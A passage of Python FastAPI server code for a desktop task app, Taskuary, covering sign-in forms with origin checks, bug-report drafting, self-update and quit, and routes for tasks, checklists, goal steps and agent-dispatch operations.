# IS its key, and only that token's hash is kept. Its POST is same-origin only (the token gate checks Origin on /api alone).
@app.get('/signin/{token}', include_in_schema=False)
def signin_page(token: str):
    from . import signin
    r = signin.peek(store, token)
    if not r: return _signin_gone(token)
    return HTMLResponse(signin.form_html(r['Site'], max(1, int((r['ExpiresAt'] - time.time()) // 60)), task=signin.for_line(store, r['TaskId'])),
                        headers=signin.HEADERS)


def _signin_gone(token: str, why: str = ''):
    "Which it is - used, and when, or expired - and the task to go back to."
    from . import signin
    from .store import task_ref
    said, tid = signin.gone_why(store, token)
    return HTMLResponse(signin.gone_html(why or said, signin.for_line(store, tid), task_ref(tid) if tid else ''), 410, headers=signin.HEADERS)


def _signin_origin_ok(headers) -> bool:
    """The token gate's Origin check, and one more: `Origin: null` with Sec-Fetch-Site same-origin is the fill page's own form (an older
    page served with no-referrer still open in a tab) - the browser sets that header, a page cannot."""
    if guard.origin_ok(headers): return True
    return str(headers.get('origin') or '').lower() == 'null' and str(headers.get('sec-fetch-site') or '').lower() == 'same-origin'


@app.post('/signin/{token}', include_in_schema=False)
async def signin_submit(token: str, request: Request):
    from urllib.parse import parse_qs
    from . import signin, totp
    if not _signin_origin_ok(request.headers):
        return HTMLResponse(signin.gone_html('This sign-in came from another page, so nothing was typed.'), 403, headers=signin.HEADERS)
    form = parse_qs((await request.body())[:16384].decode('utf-8', 'replace'), keep_blank_values=True)
    one = lambda k: (form.get(k) or [''])[0]
    try: out = await run_in_threadpool(signin.by_owner, store, token, one('username'), one('password'), one('save') == '1', None, one('key'))
    except totp.BadKey as e:            # said on the same page, the link not spent: the owner fixes the key and presses again
        r = signin.peek(store, token)
        if r: return HTMLResponse(signin.form_html(r['Site'], max(1, int((r['ExpiresAt'] - time.time()) // 60)), f'{e}.',
                                                  task=signin.for_line(store, r['TaskId'])), 400, headers=signin.HEADERS)
        return _signin_gone(token)
    except signin.NotAccepted as e:
        # the form again, on a fresh link, with the site's answer: nothing saved, the agent not told "signed in"
        r = signin.peek(store, e.again) if e.again else None
        if not r: return _signin_gone(token, f'Nothing was signed in: {e}.')
        return HTMLResponse(signin.form_html(r['Site'], signin.TTL // 60, f"{r['Site']} did not accept that password - nothing was saved. Try again.",
                                             task=signin.for_line(store, r['TaskId']), action=f'/signin/{e.again}'), 409, headers=signin.HEADERS)
    except LookupError: return _signin_gone(token)
    except (signin.SignInError, ValueError) as e:
        return HTMLResponse(signin.gone_html(f'Nothing was signed in: {e}.'), 409, headers=signin.HEADERS)
    finally: form.clear()
    from .store import task_ref
    return HTMLResponse(signin.done_html(out['site'], out['saved'], out['kept'] if out['kept'] != 'saved' else '', told=out.get('told', True),
                                         task=signin.for_line(store, out['task']), ref=task_ref(out['task'])), headers=signin.HEADERS)


MAX_BUG_BODY = 200_000       # the scrub matches every private string against every field: a client does not get to make it chew megabytes


def _owner_only(request: Request, why):
    if guard.scope_of(cfg['server'], request.headers) != guard.OWNER: raise HTTPException(403, why)


@app.post('/api/bug-report/draft')
async def bug_report_draft(request: Request):
    """The scrubbed draft behind "Report this bug". Whatever goes wrong drafting it, the person gets the one sentence -
    never a traceback and never a field that skipped the scrub."""
    from . import bugreport
    _owner_only(request, "a bug report is the owner's")
    if int(request.headers.get('content-length') or 0) > MAX_BUG_BODY: raise HTTPException(413, 'that report is too large')
    raw = b''
    async for chunk in request.stream():           # no length, no promise: stop reading at the cap
        raw += chunk
        if len(raw) > MAX_BUG_BODY: raise HTTPException(413, 'that report is too large')
    try: client = json.loads(raw or b'{}')
    except ValueError: raise HTTPException(400, 'the report was not valid JSON')
    try: return await asyncio.to_thread(bugreport.draft, store, client if isinstance(client, dict) else {})      # blocking: the loop must stay free
    except Exception as e:
        logger.warning(f'bug report draft refused: {type(e).__name__}')
        raise HTTPException(422, bugreport.SAFE_MSG)


class OpenUrl(BaseModel):
    url: str = ''


def _new_issue_url(u) -> str:
    """The canonical URL if it is the new-issue page, else ''."""
    from urllib.parse import urlsplit, urlunsplit
    try: p = urlsplit(u); port = p.port
    except ValueError: return ''
    return urlunsplit(p) if (p.scheme, p.hostname, port, p.username, p.password, p.path) == ('https', 'github.com', None, None, None, '/ldbumble/taskuary/issues/new') else ''


@app.post('/api/open-url')
def open_url(body: OpenUrl, request: Request):
    """Opens the tracker's new-issue page on this desktop (the app has no browser of its own). Only that page."""
    import webbrowser
    _owner_only(request, "opening a page is the owner's")
    if not (u := _new_issue_url(body.url)): raise HTTPException(400, 'only the new-issue page can be opened')
    threading.Thread(target=webbrowser.open, args=(u,), daemon=True).start()
    return {'opened': True}


_assets = _web_root / 'assets'
from fastapi.staticfiles import StaticFiles
import mimetypes
# The bundled IBM Plex faces: Python before 3.11 (and a Windows registry without the type) guesses nothing for .woff2,
# so they went out as text/plain
mimetypes.add_type('font/woff2', '.woff2')


class _HashedAssets(StaticFiles):
    """vite's hashed build output, sent the way a hashed file can be: gzip-compressed for a browser that takes it, and
    cached for good. Plain StaticFiles sent the 1.8 MB entry chunk raw, with no Cache-Control, so every cold load paid for
    3+ MB on the wire and a warm one revalidated each file. A new build renames its files, so `immutable` is safe; the
    page that names them (index.html) stays no-store. The compressed copy is kept per (file, mtime, size)."""
    _gz: dict = {}
    _GZ = ('.js', '.css', '.json', '.svg', '.map', '.txt', '.html')

    async def get_response(self, path, scope):
        r = await super().get_response(path, scope)
        if r.status_code != 200 or not isinstance(r, FileResponse): return r
        r.headers['Cache-Control'] = 'public, max-age=31536000, immutable'
        if not path.endswith(self._GZ): return r
        r.headers['Vary'] = 'Accept-Encoding'
        from starlette.datastructures import Headers
        if scope.get('method') != 'GET' or 'gzip' not in Headers(scope=scope).get('accept-encoding', ''): return r
        import gzip, os
        st = os.stat(r.path); key = (str(r.path), st.st_mtime_ns, st.st_size)
        body = self._gz.get(key)
        if body is None:
            raw = await asyncio.to_thread(Path(r.path).read_bytes)
            body = await asyncio.to_thread(gzip.compress, raw, 6, mtime=0)
            self._gz[key] = body
        keep = {k: r.headers[k] for k in ('cache-control', 'etag', 'last-modified') if k in r.headers}
        return Response(body, media_type=r.media_type, headers={**keep, 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip'})


app.mount('/assets', _HashedAssets(directory=str(_assets), check_dir=False), name='assets')
# ...and the walk's shots of each tab. NOT under /assets: those are vite's hashed build output, and
# these are files the repo ships and the page names by a fixed path (walk.STOPS holds `/walk/x.png`),
# so mounting /assets never covered them. It was missing for a whole branch - the files were on disk,
# in the bundle and in the wheel, and every one of the nine 404ed because no route served them.
# check_dir=False for the same reason as /assets: a source checkout that has not been built yet has
# no web/ at all, and the server must still start (it answers the self-healing 503 above).
app.mount('/walk', StaticFiles(directory=str(_web_root / 'walk'), check_dir=False), name='walk')

from fastapi.responses import FileResponse

@app.get('/favicon.ico', include_in_schema=False)
def favicon(): return FileResponse(Path(__file__).parent / 'web' / 'favicon.ico')

@app.get('/favicon.png', include_in_schema=False)
def favicon_png(): return FileResponse(Path(__file__).parent / 'web' / 'favicon.png')


from . import __version__ as _ver
_started = datetime.now().isoformat(sep=' ', timespec='seconds')

@app.get('/api/version')
def version(): return {'version': _ver, 'started': _started, 'cli_installer_revision': 2}

# ── update in place (update.py): Settings → Updates ─────────────────────────────────────
@app.get('/api/update')
def update_check(force: int = 0):
    from . import awake, update
    # ...with what an Update now would wait for, and whether one already waits (update.when_idle)
    return {**update.check(force=bool(force)), 'waits': update.waits_line(awake.running(store)),
            'queued': update.QUEUED['at'] is not None, 'queued_error': update.QUEUED['error']}

def _update_now(info: dict) -> dict:
    from . import update
    out = update.apply(info=info)
    # Once apply() returns, the swap helper is ALREADY RUNNING and waiting for this process to go.
    # Anything that throws between here and exit_soon strands it on a PID that never dies - which
    # is how one machine was left with no app and a console spinning on `find "<pid>"`
    # (2026-09-15). The audit row is worth writing and is not worth the app for.
    try: store.audit('app', 0, 'update', ACTOR, detail={k: v for k, v in out.items() if k != 'pip'})
    except Exception as e: logger.warning(f'update: could not write the audit row, restarting anyway - {e}')
    if out.get('restarting'): update.exit_soon()
    return out

@app.post('/api/update')
def update_apply():
    """Fetch the latest release and swap it in. The answer goes out first; the process ends a
    moment later so the new build can start. With an agent or a workflow run live it WAITS for
    them, and says so (update.when_idle). Owner-only: guard.py refuses an agent token."""
    from . import awake, update
    try: info = update.ready()
    except Exception as e: raise HTTPException(422, str(e))
    try: return update.when_idle(lambda: awake.running(store), lambda: _update_now(info))
    except Exception as e: raise HTTPException(422, str(e))


# ── Quit, from the browser's top line (the owner, 2026-10-25) ─────────────────────────────────────
@app.get('/api/quit')
def quit_would_stop():
    """What a Quit would stop right now - the button's hover says it, so the press is the decision with no box asking (awake.live)."""
    from . import awake
    agents, flows = awake.live(store)
    return {'agents': agents, 'workflows': flows, 'running': awake.said(agents, flows)}

@app.post('/api/quit')
def quit_app():
    """Stop Taskuary the way Ctrl+C does: the answer goes out, then the server is told to exit and its lifespan stops what it
    started - agents, CLI children, the share port. Says what it stopped, for the page left behind. Owner-only (guard.py)."""
    from . import welcome, workerstate
    srv = workerstate.SERVER[0]
    if srv is None: raise HTTPException(409, "this Taskuary was not started in a way it can stop itself - close the window or the terminal that runs it")
    try: stopped = [task_ref(t['TaskId']) for t in welcome.working(store)]
    except Exception: stopped = []
    store.audit('app', 0, 'quit', ACTOR, detail={'stopped': stopped})
    threading.Timer(0.5, lambda: setattr(srv, 'should_exit', True)).start()
    return {'quitting': True, 'stopped': stopped}

def _send_block(channel, has_message=True) -> str:
    """The reason an approved reply could not leave on this channel - outbound.send_block's words,
    '' when it can. Rides on feed rows and reviews as SendBlock, so every surface shows the same
    sentence beside a draft it cannot send (PW-044)."""
    if not has_message: return 'nothing arrived to reply to'
    return outbound.send_block(store, channel)


def _can_send(channel, has_message=True, gh_ok=None) -> bool:
    """Can an approved reply actually LEAVE on this channel? One answer for the whole app -
    outbound.can_reply - so the Approve button, triage and the agent's wrap-up cannot
    disagree. The UI turns an unsendable draft's Approve into 'No response required'."""
    if not has_message: return False
    return outbound.can_reply(store, channel)


def _send_state(memo: dict, channel, has_message=True) -> tuple:
    """(CanSend, SendBlock) for one channel, answered once per request. The email probe reads the
    connector cards (PW-143) and a 500-row Timeline must not read them 500 times."""
    k = (str(channel or '').lower(), bool(has_message))
    if k not in memo:
        ok = _can_send(channel, has_message)
        memo[k] = (ok, '' if ok else _send_block(channel, has_message))
    return memo[k]


def _review_send_state(memo: dict, r: dict) -> tuple:
    """(CanSend, SendBlock) for one draft. A message the owner STARTED - one of a task's own emails or chats (slots.py), or
    + New's Send something - answers nothing, so its channel and recipient are in its envelope, not on a message: read off
    the message alone it was "nothing arrived to reply to", and the card offered Copy & close instead of Send (2026-10-09)."""
    try: env = json.loads(r.get('Deliver') or '{}') or {}
    except (TypeError, ValueError, AttributeError): env = {}
    if env.get('kind') in outbound.OWN_ROAD: return True, ''
    return _send_state(memo, r.get('Channel') or env.get('channel'), bool(r.get('MessageId')) or bool(env.get('to')))


@app.get('/api/feed')
def feed(limit: int = 100, offset: int = 0, pending_only: bool = False, channel: str = None, source: str = None,
         request: Request = None):
    try: days = int(store.get_setting('feed_days') or 14)
    except (TypeError, ValueError): days = 14        # a blanked number field saves '' - the Timeline must not die of it
    tag = '"' + store.feed_tag(days, pending_only, channel, source) + '"'
    if request is not None and request.headers.get('if-none-match') == tag:
        return Response(status_code=304, headers={'ETag': tag, 'Cache-Control': 'no-cache'})
    rows = store.feed(max(1, min(limit, 500)), days, pending_only, channel, max(offset, 0), source)
    memo = {}
    for r in rows:
        r['CanSend'], r['SendBlock'] = _send_state(memo, r.get('Channel'), True)
    return JSONResponse({'data': rows}, headers={'ETag': tag, 'Cache-Control': 'no-cache'})


def _processing_live():
    try:
        return hub_term.live_sessions(tail=0)
    except Exception:
        return None  # Unavailable observation is distinct from an observed empty roster.


@app.exception_handler(processing_all.AllError)
async def _all_error(_request, error: processing_all.AllError):
    # every route that reads the inventory can meet this; one answer, the same JSON the explicit catches give
    return JSONResponse({'detail': error.detail}, status_code=error.status)

@app.get('/api/processing/items/{item_id}/detail')
def processing_item_detail(item_id: str, kind: str = None, id: int = None, view_revision: str = None):
    try:
        result = processing_all.item_detail(store, item_id, kind=kind, local_id=id,
                                             view_revision=view_revision, live_state=_processing_live())
        row = result.get('row')
        detail = result.get('detail') or {}
        if detail.get('task'):
            detail['artifacts'] = [_artifact_row(a) for a in detail.get('artifacts') or []]
        if row is not None:
            row['CanSend'] = _can_send(row.get('Channel'), True, store.github_replies_ok())
            row['SendBlock'] = '' if row['CanSend'] else _send_block(row.get('Channel'), True)
            result['detail_revision'] = processing_all._digest({key: value for key, value in result.items()
                                                               if key != 'detail_revision'})
        return result
    except processing_all.AllError as exc:
        raise HTTPException(exc.status, exc.detail) from exc


def _queued_info(q):
    """The card's hover text for a held-back dispatch: what it waits for, and why."""
    if not q: return None
    b = q.get('BehindTaskId')
    return {'behind': task_ref(b) if b else None, 'value': q.get('Value'), 'why': q.get('Why'),
            'behindTitle': (store.get_task(b) or {}).get('Title') if b else None,
            'reason': q.get('Reason'), 'since': q.get('CreatedAt'),
            # the retry budget (PW-085..087): waiting | retrying | failed, how many tries, the last error and the next one
            'state': q.get('State') or 'waiting', 'attempts': int(q.get('Attempts') or 0), 'lastError': q.get('LastError'), 'nextAt': q.get('NextAt'),
            # a setup error fails every Start the same way, so the card must not offer Start as the fix (blackboard.failed_line)
            'permanent': q.get('State') == 'failed' and blackboard.is_permanent(q.get('LastError'))}


def _playbook_brief(task, books=None):
    """The existing job description attached to a task, shaped for the work surfaces.

    This deliberately is not an agent capability profile. A named worker can perform different
    kinds of work; the task's playbook says which job it is doing this time.
    """
    slug = playbooks.of_task(task)
    if not slug: return None
    found = (books or {}).get(slug) if books is not None else playbooks.for_task(task)
    uses = (found or {}).get('uses') or []
    if isinstance(uses, str): uses = playbooks.uses_of(found or {})
    return {'slug': slug, 'title': (found or {}).get('title') or slug.replace('-', ' '),
            'uses': uses, 'missing': found is None}

@app.get('/api/tasks')
def tasks(status: str = None, active: bool = False, q: str = None):
    """An interactive session IS an agent working - the UI has to see it, or a task with a
    live CLI on it reads as 'queued' while the agent sits there asking a question.

    `q` searches here. It replaces `search`, which asked for six GROUP_CONCAT blobs over the whole
    message table so the Tasks tab could grep them in the browser - 34ms of a 35ms query and 69KB
    of a 319KB payload on a real store. Nothing is shipped to be searched now; the words are."""
    qs = {q['TaskId']: q for q in store.queued_dispatches()}
    wc = store.waiting_counts()
    agented = store.agented_task_ids()      # the Board's Done lane shows agent work only
    books = {b['slug']: b for b in playbooks.list_all()}
    # One lightweight pass over the live sessions. for_task() used to scan the roster and build
    # the FULL session payload (including git status and witness reconciliation) for every task;
    # with hundreds of tasks that made Tasks and Board wait behind repository I/O.
    sessions = {s['taskId']: s for s in hub_term.live_sessions(tail=0, details=False) if s.get('taskId')}
    # WHAT THE WORK RAIL SHOWS - OR SHOWED YOU TODAY - THE TASKS TAB AND THE BOARD SHOW (the owner, 2026-09-24: "if task
    # is on work rail it should be in tasks tab regardless of when it was" / "if it interacted today with work it should
    # stay on the done tab, same in board columns"): an agent's result from yesterday was cut from Done as old, and once
    # read it left the rail and every list with it
    rail = _rail_tids() | store.worked_today_task_ids()
    return {'data': [{**t, 'ref': task_ref(t['TaskId']), 'Playbook': _playbook_brief(t, books), 'OnWorkToday': t['TaskId'] in rail,
                      'Session': sessions.get(t['TaskId']),
                      'Queued': _queued_info(qs.get(t['TaskId'])), 'Waiting': wc.get(t['TaskId'], 0),
                      'HadAgent': t['TaskId'] in agented,
                      # what the task IS right now - the one state the list's chip and the Board's column both draw (T1-T9)
                      'State': taskstate.state(store, t, sessions.get(t['TaskId']), qs.get(t['TaskId']))}
                     for t in store.list_tasks(status, active_only=active, q=q, also=rail)]}


@app.get('/api/search')
def search_everything(q: str = ''):
    """Tasks, mail, chats, pull requests, Advisor posts and sources for the words typed - each with its pill (search.py)."""
    return search.everything(store, q)


def _rail_tids() -> set:
    """The task ids on the work rail right now, from the rail as last built - never a build (that reads the live
    sessions, which the Tasks list must not), and never a reason for the list to fail."""
    from . import concierge, funnel
    try:
        rows = list((funnel.cached_pile(store) or {}).get('items', []))
        # ...and the card on the TABLE, which the rail draws although showing it read it (the owner, 2026-09-24:
        # "also not in tasks pane as well") - looked up in the cached build, never a new one
        dock = str(store.get_setting('assistant_dock_task_id') or '')
        key = concierge.current_key(store, int(dock)) if dock.isdigit() else ''
        if key: rows += [i for i in funnel.full_items(store) or [] if i.get('key') == key or key in (i.get('aliases') or [])]
        return {int(i['tid']) for i in rows if i.get('tid')}
    except Exception as e:
        logger.warning(f'tasks: the rail could not be read for OnWorkToday: {e}'); return set()

def _read_hand_task(tid: int, text: str, goal: bool = False):
    """A task typed into + New skips triage, so it had no checklist - one block of words with no boxes (the owner, 2026-10-09:
    "when i create task the task list looks weird?? (no checkboxes?)"). The same reading a promoted message gets
    (triage.extract_ask), off the request: each distinct thing asked becomes a box, an email it asks for becomes one of the
    task's emails. The owner's own words stay the summary. A brain that fails leaves the task as typed. A goal's boxes are
    its steps (plan_goal)."""
    if goal: return plan_goal(tid, text)
    try:
        from . import concierge, slots, triage
        ask = triage.extract_ask({'body': text}, concierge.brain(store, fast=True))
        if ask.get('checklist') and not store.task_checklist(tid): store.set_task_checklist(tid, ask['checklist'], 'triage')
        if ask.get('outputs'): slots.add(store, tid, ask['outputs'], 'triage')
    except Exception as e: logger.info(f'could not read the checklist of {task_ref(tid)}: {e}')


def plan_goal(tid: int, text: str):
    """The model writes the goal's steps (goals.plan - one planner for the New sheet, Re-plan and triage's goal)."""
    from . import goals
    goals.plan(store, tid, text)


@app.post('/api/tasks/{task_id}/read-ask')
def read_hand_task(task_id: int, background: BackgroundTasks, body: ReadAskBody = None):
    """+ New asks for its task to be read once it exists (_read_hand_task) - answered at once, read behind it."""
    t = store.get_task(task_id)
    if not t: raise HTTPException(404, 'task not found')
    goal = bool(body and body.goal) or bool(t.get('DoneWhen'))
    words = t.get('Summary') or t.get('Title') or ''
    if goal: words = f"{t.get('Title') or ''}\nDone when: {t.get('DoneWhen') or ''}\n{words}"
    background.add_task(_read_hand_task, task_id, words, goal)
    return {'ok': True}


@app.post('/api/tasks')
def create_task(body: TaskBody):
    if not body.Title: raise HTTPException(422, 'Title is required')
    # made by the owner on the page: an ask from the desktop once an agent works it (asks.py)
    tid = store.create_task({**{k: v for k, v in body.model_dump().items() if v is not None}, 'AskedVia': 'desktop', 'OriginBase': 'owner'}, ACTOR)
    # A task created by the owner is their durable TODO. Agent runs may come and go without
    # silently completing it; only routed/triaged work is eligible for automatic completion.
    from . import selfclose
    selfclose.claim(store, tid, ACTOR)
    store.audit('task', tid, 'create', ACTOR)
    return {'taskId': tid, 'ref': task_ref(tid)}


@app.post('/api/assistant/dock')
def assistant_dock():
    """Return the one durable conversation behind the floating Taskuary guide.

    It uses the normal general-work session and comment history, but SourceRef keeps this
    application-level conversation off the owner's task list and Timeline.
    """
    from .general import dock_task
    task, created = dock_task(store, ACTOR)
    return {'task': task, 'ref': task_ref(task['TaskId']), 'created': created}


@app.post('/api/assistant/dock/new')
def assistant_dock_new(background: BackgroundTasks):
    from .processing_navigation import chat_change
    with chat_change(store):
        return _assistant_dock_new(background)


def _assistant_dock_new(background: BackgroundTasks):
    """Archive the current dock conversation and return a genuinely fresh one.

    A client-side clear is dishonest here: the model session and the task comments would still
    carry the old context. The old hidden task remains the durable record, while its replacement
    starts with no messages. Reviews and tasks are separate workspace state and remain available.
    """
    from . import general
    old = _archive_dock(background)
    task, created = general.dock_task(store, ACTOR)
    _warm_assistant()              # the new chat's CLI starts now, not on its first ask
    return {'task': task, 'ref': task_ref(task['TaskId']), 'created': created,
            'archivedTaskId': old['TaskId']}


def _archive_dock(background: BackgroundTasks) -> dict:
    """Put the live guide conversation away - New chat, and Continue on an earlier one."""
    from . import general
    old, _created = general.dock_task(store, ACTOR)
    session = general.session_for(old['TaskId'])
    if session and session.busy:
        raise HTTPException(409, 'Taskuary is still answering. Stop it or wait before starting a new chat.')
    store.update_task(old['TaskId'], {'Status': 'done'}, ACTOR)
    store.audit('task', old['TaskId'], 'archive_assistant_dock', ACTOR)
    from . import funnel, concierge
    funnel.reset_walk(store)       # the new chat walks the pipe afresh; what was decided stands
    store.set_setting(f"{concierge.SID_KEY}:{old['TaskId']}", '', ACTOR)   # a new chat is a new CLI conversation too
    from . import clipool; clipool.close(f"{concierge.LIVE_KEY}:{old['TaskId']}")   # ...and its live CLI process goes with it
    if session:
        # Closing is also the conservative point where the Hub may retain hard-earned knowledge.
        # That can call an AI, so it belongs after the response rather than delaying New chat.
        background.add_task(session.close)
    return old

class ChecklistTick(BaseModel):
    done: bool = True


class ChecklistEdit(BaseModel):
    items: list


@app.patch('/api/tasks/{task_id}/checklist/{item_id}')
def tick_checklist(task_id: int, item_id: str, body: ChecklistTick):
    """One box, and only the box. TICK THEM ALL, THEN MARK DONE (T16, the owner, 2026-09-25: "they should click all the
    do's and then hit mark done"): the last tick used to close the task (2026-09-18, TQ-0626), so it followed the task
    into Done while Mark done moved on to the next one - two closes that behaved differently. Mark done is the close."""
    t = store.get_task(task_id)
    if not t: raise HTTPException(404, 'task not found')
    from . import slots
    # one of the task's emails (slots.py): ticking it lets that email go - its draft is never sent, and the task stays open
    if body.done and any(i['id'] == item_id for i in slots.open_(store, task_id)):
        closed = slots.drop(store, task_id, item_id, ACTOR)
        return {'ok': True, 'checklist': store.task_checklist(task_id), 'closed': closed}
    if not store.tick_checklist_item(task_id, item_id, body.done, ACTOR): raise HTTPException(404, 'no such checklist item')
    return {'ok': True, 'checklist': store.task_checklist(task_id), 'closed': False}


class ChecklistNote(BaseModel):
    note: str = ''


@app.patch('/api/tasks/{task_id}/checklist/{item_id}/note')
def note_checklist(task_id: int, item_id: str, body: ChecklistNote):
    """A note on one to-do, kept with it ('' takes it off) - the to-do's own Note (the owner, 2026-10-20)."""
    if not store.get_task(task_id): raise HTTPException(404, 'task not found')
    if not store.note_checklist_item(task_id, item_id, body.note, ACTOR): raise HTTPException(404, 'no such checklist item')
    return {'ok': True, 'checklist': store.task_checklist(task_id)}


@app.put('/api/tasks/{task_id}/checklist')
def edit_checklist(task_id: int, body: ChecklistEdit):
    """The owner's words for the list; a box whose words are unchanged keeps its state (PW-076)."""
    if not store.get_task(task_id): raise HTTPException(404, 'task not found')
    return {'ok': True, 'checklist': store.set_task_checklist(task_id, body.items, ACTOR)}


@app.get('/api/tasks/{task_id}/steps')
def goal_steps(task_id: int):
    """A goal's boxes with the child task behind each (store.goal_steps), as the task page lists them (spec 2026-10-12)."""
    if not store.get_task(task_id): raise HTTPException(404, 'task not found')
    from . import taskstate
    from .processing_unread import holder_name
    out, arr = [], store.step_arrivals(task_id)       # ...and the mail triage said served each step (spec 2026-10-12, step 5)
    for x in store.goal_steps(task_id):
        c = x.pop('child')
        out.append({**x, 'ref': task_ref(c['TaskId']) if c else None, 'status': (c or {}).get('Status'),
                    'who': holder_name((c or {}).get('Assignee')), 'state': taskstate.state(store, c) if c else None, 'arrivals': arr.get(x['id'], [])})
    return {'steps': out}


@app.post('/api/tasks/{task_id}/steps/{item_id}/start')
def start_step(task_id: int, item_id: str):
    """One box becomes a task of its own, the goal's child: made once, claimed as the owner's like any + New task."""
    g = store.get_task(task_id)
    if not g: raise HTTPException(404, 'task not found')
    boxes = store.task_checklist(task_id)
    box = next((i for i in boxes if i['id'] == item_id), None)
    if not box: raise HTTPException(404, 'no such step')
    if box.get('tid') and store.get_task(box['tid']): return {'taskId': box['tid'], 'ref': task_ref(box['tid'])}
    k = [i['id'] for i in boxes].index(item_id) + 1
    # the goal's repository rides to its step: an agent on the step works where the goal said (the owner, 2026-10-12)
    repo = [x for x in re.split(r'[\s,]+', str(g.get('Tags') or '')) if x.startswith('repo:')]
    tid = store.create_task({'Title': box['text'][:300], 'Kind': 'general', 'ParentId': task_id, 'Source': 'goal', 'SourceRef': f'goal:{task_id}:{item_id}',
                             'Summary': f"Step {k} of {task_ref(task_id)} \"{g.get('Title') or ''}\". Done when: {g.get('DoneWhen') or ''}",
                             'AskedVia': 'desktop', **({'Tags': repo[0]} if repo else {})}, ACTOR)
    store.link_step(task_id, item_id, tid, ACTOR)
    from . import selfclose
    selfclose.claim(store, tid, ACTOR)
    store.audit('task', tid, 'create', ACTOR, detail={'goal': task_id, 'step': item_id})
    return {'taskId': tid, 'ref': task_ref(tid)}


# ── shared operations (operations.py): propose, edit, confirm once, and the durable record ──────
class OperationBody(BaseModel): kind: str; target: int; params: dict = {}
class OperationEdit(BaseModel): params: dict
class OperationConfirm(BaseModel): version: int
class DiscussBody(BaseModel): body: str; actor: str = 'owner'

# EVERY ACT LEAVES A RECEIPT (Stream B, the owner 2026-10-18): the task page's presses run down this road, and the receipt says what was
# done (concierge.receipt_turn) - never a Take it back (the owner, 2026-10-19): a wrong Mark done is put right with Reopen task
# ...and a press that went through is a badge on its card, not a line in the chat (the owner, 2026-10-22: "we don't need that text ever")

def _run_operation(op: dict, background: BackgroundTasks):
    """The shared handler for each kind."""
    return _run_kind(op, background)

def _run_kind(op: dict, background: BackgroundTasks):
    """The shared handler for each kind - the same code the task page and the timeline run."""
    kind, tid, mid, p = op['kind'], op['target'], op['target'], op['params'] or {}
    # TRUST AND START (the owner, 2026-10-22: "if i hit go then it should start anyway"): the owner's word on the sender first - the
    # page's Trust them - then the very start that was refused, so one press does both
    if p.get('trust') and op.get('targetKind') == 'task' and store.get_task(tid):
        from . import origin
        origin.raise_to(store, tid, 'trusted', ACTOR)
    if kind == 'task.create_from_message':
        k = str(p.get('kind') or 'task').lower()
        # WHAT THE OWNER SAID IN THE AGENT BOX starts it with those words (the owner, 2026-10-23): the chat road opened on the task's
        # own summary and dropped them. Said nothing and chose nothing, it is the chat road as it always was - the item is the ask
        if k == 'general' and any(p.get(f) for f in ('instructions', 'agent', 'pick', 'model')):
            return dispatch_message(mid, DispatchBody(kind='general', agent=p.get('agent'), pick=p.get('pick'), model=p.get('model'),
                                                      instruction=p.get('instructions')), background)
        if k == 'general': return chat_message(mid, background)
        if k == 'coding':
            out = dispatch_message(mid, DispatchBody(kind='coding', agent=p.get('agent'), brain=p.get('brain'),
                                                     instruction=p.get('instructions'), model=p.get('model')), background)
            # a repository still to choose is a decision, not a start: the item stays where it is (PW-135)
            if out.get('dispatch') == 'needs_repo':
                raise operations.Halt(f"{out.get('ref') or 'it'} needs a repository first - {out.get('reason') or 'pick one'}", out)
            return out
        return mine_message(mid, MineBody(kind='task', title=p.get('title')), background)
    if kind == 'idea.act': return assistant.act(store, tid, str(p.get('verb') or ''), ACTOR)
    if kind == 'message.file': return file_message(mid, NotATaskBody(learn=bool(p.get('learn', True))), background)
    if kind == 'message.reply': return open_reply(mid, None)
    if kind == 'dispatch.prepare':
        # ...through the task's own dispatch DOOR, not the handler underneath it: the door is where a
        # repository the agent cannot open becomes a decision (`needs_repo`) instead of a 422. Calling
        # the handler directly skipped that, so the task page's Start showed "422: I could not tell which
        # checkout this belongs in" as a dead end - and its advice named a task menu the card redesign
        # had already removed (the owner, 2026-09-22: "don't see anywhere on agent or task to choose repo").
        out = dispatch_task(tid, DispatchBody(kind=p.get('kind'), agent=p.get('agent'), brain=p.get('brain'),
                                              instruction=p.get('instructions'), model=p.get('model')), background)
        if out.get('dispatch') == 'needs_repo':
            raise operations.Halt(f"{out.get('ref') or 'it'} needs a repository first - {out.get('reason') or 'pick one'}", out)
        return out
    if kind == 'task.set_kind':
        t = store.get_task(tid) or {}
        # A GOAL OR NOT (spec 2026-10-12): "that was a task, not a goal" and "make this a goal" are kind corrections like any, taught on
        # the same curve. A goal let go keeps its boxes as plain boxes; a task made a goal takes its ask as what done looks like and
        # the planner proposes steps when it has none.
        if str(p.get('kind')) == 'goal':
            from . import goals
            store.update_task(tid, {'DoneWhen': t.get('DoneWhen') or t.get('Summary') or t.get('Title') or ''}, ACTOR); store.tag_task(tid, 'goal', actor=ACTOR)
            if not store.task_checklist(tid): goals.plan_later(store, tid, goals.words(store.get_task(tid)))
            if p.get('learn', True): _teach_routing(tid, 'kind', 'goal', background=background)
            return {'kind': 'goal'}
        if str(p.get('kind')) == 'task' and is_goal(t):
            store.update_task(tid, {'DoneWhen': None}, ACTOR); store.tag_task(tid, 'goal', on=False, actor=ACTOR)
            if p.get('learn', True): _teach_routing(tid, 'kind', 'task', background=background)
            return {'kind': 'task'}
        if str(p.get('kind')) == 'task': return not_coding(tid, NotATaskBody(learn=bool(p.get('learn', True))), background)
        # ...and every other kind down the task page's own road, not a bare field write. Writing
        # the column directly skipped BOTH things the PATCH does: it taught nothing (so "hand it
        # to the assistant" from a card was the one reclassification that never reached either
        # memory) and it left a live session attached to a task that had changed worker mode.
        update_task(tid, TaskBody(Kind=str(p.get('kind'))), background)
        return {'kind': p.get('kind')}
    if kind == 'task.not_a_task': return not_a_task(tid, NotATaskBody(learn=bool(p.get('learn', True))), background)
    if kind == 'routing.remember':
        # the assistant teaching the routing memory in words, which it could not do at all: it could
        # keep a free-text fact (memory.remember) that every verdict then reads, but not a SCOPED,
        # weighted one about this sender and this field. Teaching only - the task is not moved.
        from . import routingmemory as rmem
        field, value = str(p.get('field') or '').strip().lower(), str(p.get('value') or '').strip()
        if field not in rmem.FIELDS: raise HTTPException(422, f"a routing lesson is about {', '.join(rmem.FIELDS)} - not {field or 'nothing'}")
        if not value: raise HTTPException(422, 'say what it should have been')
        if not store.get_task(tid): raise HTTPException(404, 'task not found')
        taught = _teach_routing(tid, field, value, background=background)
        if not taught: return {'field': field, 'value': value, 'learned': 0, 'already': True}
        store.add_comment(tid, ACTOR, 'human', f'You told the assistant: work like this is {field} {value}. Triage learns from it.')
